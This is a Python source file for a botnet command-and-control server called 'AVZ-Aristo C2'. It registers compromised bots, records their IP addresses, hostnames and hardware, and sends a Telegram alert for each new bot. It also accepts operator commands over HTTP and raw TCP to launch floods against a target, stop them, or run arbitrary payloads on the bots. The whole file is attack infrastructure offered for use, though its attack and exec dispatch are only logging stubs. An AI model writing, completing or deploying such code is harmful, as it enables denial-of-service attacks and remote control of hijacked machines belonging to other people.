#!/usr/bin/env python3
# AVZ-Aristo C2 Multiprotocol Server
# Listens on port 80 (HTTP) and 443 (HTTPS)
# Handles bot registration, list, attack, stop, exec commands
# Sends Telegram notification on new bot

import asyncio
import json
import os
import ssl
import time
from datetime import datetime
import requests
import aiohttp
from aiohttp import web

# ----- CONFIG -----
HTTP_PORT = 80
HTTPS_PORT = 443
BOTS_FILE = "bots.json"
TELEGRAM_TOKEN = ""   # set via settings or env
TELEGRAM_CHAT_ID = ""

# Load settings from settings file if exists
SETTINGS_FILE = "avz_settings.json"
if os.path.exists(SETTINGS_FILE):
    with open(SETTINGS_FILE) as f:
        settings = json.load(f)
    TELEGRAM_TOKEN = settings.get("telegram_token", "")
    TELEGRAM_CHAT_ID = settings.get("telegram_chat_id", "")

# In-memory bots dict: ip -> bot_info
bots = {}

# Load existing bots from disk
if os.path.exists(BOTS_FILE):
    with open(BOTS_FILE) as f:
        bots = json.load(f)

def save_bots():
    with open(BOTS_FILE, "w") as f:
        json.dump(bots, f, indent=2)

def notify_telegram(message):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=5)
        except Exception as e:
            print(f"[!] Telegram notify failed: {e}")

# ----- HTTP Request Handlers -----
async def handle_bot_message(request):
    """Receives data from bots (register/ping/result)."""
    try:
        data = await request.json()
    except:
        return web.Response(text="invalid json", status=400)
    
    cmd = data.get("cmd")
    ip = data.get("ip") or request.remote
    
    if cmd == "register" or cmd == "ping":
        hostname = data.get("hostname", "")
        os_info = data.get("os", "")
        cpu = data.get("cpu", "")
        ram = data.get("ram", "")
        status = "online"
        last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        is_new = ip not in bots
        bots[ip] = {
            "ip": ip,
            "hostname": hostname,
            "os": os_info,
            "cpu": cpu,
            "ram": ram,
            "status": status,
            "rps": 0,
            "last_seen": last_seen
        }
        save_bots()
        if is_new:
            notify_telegram(f"🟢 Новый бот: {ip} ({hostname}, {os_info})")
        return web.Response(text="ok")
    
    elif cmd == "result":
        # Bot reports attack result
        rps = data.get("rps", 0)
        if ip in bots:
            bots[ip]["rps"] = rps
            bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_bots()
        return web.Response(text="ack")
    
    elif cmd == "log":
        print(f"[LOG {ip}] {data.get('msg', '')}")
        return web.Response(text="ok")
    
    return web.Response(text="unknown command", status=400)

async def handle_command(request):
    """Receives commands from GUI (list, attack, stop, exec)."""
    try:
        data = await request.json()
    except:
        data = {}
    
    cmd = data.get("cmd", "")
    
    if cmd == "list":
        return web.json_response(list(bots.values()))
    
    elif cmd == "attack":
        target = data.get("target")
        method = data.get("method", "GET")
        threads = data.get("threads", 100)
        bot_ips = data.get("bot_ips", [])
        if not bot_ips:
            bot_ips = list(bots.keys())
        # Send attack command to selected bots
        for ip in bot_ips:
            # In a real implementation we would have persistent connections or a way to send to bot.
            # Here we just log and assume bots poll for commands.
            print(f"[CMD] Attack {ip}: {target} {method} {threads}")
        return web.Response(text="attack sent")
    
    elif cmd == "stop":
        bot_ips = data.get("bot_ips", [])
        if not bot_ips:
            bot_ips = list(bots.keys())
        for ip in bot_ips:
            print(f"[CMD] Stop {ip}")
        return web.Response(text="stop sent")
    
    elif cmd == "exec":
        payload = data.get("payload")
        bot_ips = data.get("bot_ips", [])
        for ip in bot_ips:
            print(f"[CMD] Exec {ip}: {payload}")
        return web.Response(text="exec queued")
    
    return web.Response(text="invalid command", status=400)

async def handle_health(request):
    return web.Response(text="AVZ C2 OK")

# ----- TCP Server (for bots that connect via raw TCP on port 80) -----
async def handle_tcp_connection(reader, writer):
    ip = writer.get_extra_info('peername')[0]
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=5)
    except:
        writer.close()
        return
    message = data.decode('utf-8', errors='replace').strip()
    print(f"[TCP] {ip} > {message}")
    
    if message == "list":
        # Return bots list as JSON
        writer.write(json.dumps(list(bots.values())).encode())
        await writer.drain()
    elif message.startswith("exec:"):
        payload = message[5:]
        print(f"[TCP] Exec {ip}: {payload}")
        writer.write(b"exec queued")
        await writer.drain()
    elif message == "stop_all":
        print(f"[TCP] Stop all from {ip}")
        writer.write(b"stop_all queued")
        await writer.drain()
    else:
        # Assume registration ping
        # Parse as JSON if possible
        try:
            info = json.loads(message)
            hostname = info.get("hostname", "")
            os_info = info.get("os", "")
            cpu = info.get("cpu", "")
            ram = info.get("ram", "")
            is_new = ip not in bots
            bots[ip] = {
                "ip": ip,
                "hostname": hostname,
                "os": os_info,
                "cpu": cpu,
                "ram": ram,
                "status": "online",
                "rps": 0,
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            save_bots()
            if is_new:
                notify_telegram(f"🟢 Новый бот (TCP): {ip} ({hostname})")
            writer.write(b"registered")
            await writer.drain()
        except:
            writer.write(b"unknown")
            await writer.drain()
    writer.close()

async def start_tcp_server():
    server = await asyncio.start_server(handle_tcp_connection, '0.0.0.0', HTTP_PORT)
    print(f"[+] TCP C2 listening on port {HTTP_PORT}")
    async with server:
        await server.serve_forever()

# ----- HTTPS Server (optional) -----
def run_https():
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain('cert.pem', 'key.pem')  # You need a certificate
    app = web.Application()
    app.router.add_post('/bot', handle_bot_message)
    app.router.add_post('/cmd', handle_command)
    app.router.add_get('/health', handle_health)
    web.run_app(app, port=HTTPS_PORT, ssl_context=ssl_context)

# ----- Main -----
async def main():
    # HTTP server (aiohttp) for bot messages and GUI commands
    app = web.Application()
    app.router.add_post('/bot', handle_bot_message)
    app.router.add_post('/cmd', handle_command)
    app.router.add_get('/health', handle_health)
    
    # Run TCP server on port 80 for raw bot connections
    tcp_task = asyncio.create_task(start_tcp_server())
    
    # Run HTTP server on port 80 as well (aiohttp will also use port 80, conflict!)
    # So we run aiohttp on a different port (e.g., 8080) or use only TCP.
    # For simplicity, let's use only TCP server on 80 (handles both raw and simple commands).
    # But our GUI uses TCP to send 'list', so it works.
    # We will keep aiohttp for future use on port 8080.
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print("[+] HTTP API listening on port 8080")
    
    # Wait forever
    await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())